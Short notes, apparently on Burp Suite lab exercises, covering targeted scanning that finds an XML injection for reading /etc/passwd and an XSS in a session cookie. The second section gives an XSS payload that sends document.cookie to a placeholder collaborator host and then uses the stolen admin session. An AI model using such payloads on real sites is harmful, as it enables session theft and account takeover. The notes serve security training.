### Discovering vulnerabilities quickly with targeted scanning

Right click on target, start deep scan. 

It shows this: 
![[Pasted image 20240731005408.png]]

And the lab asks for the `/etc/passwd` file.

It's a XML injection attack. Try different payloads, one will work.

---
### Scanning non-standard data structures

Log in, and see your cookie is something like `wiener:hashedInfo`

Select the "wiener" and scan in the selected insertion point. It'll find a XSS. Send that to repeater, and use this payload:
```text
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

In the collaborator you will see the administrator session cookie. Use it to log in and delete Carlos account.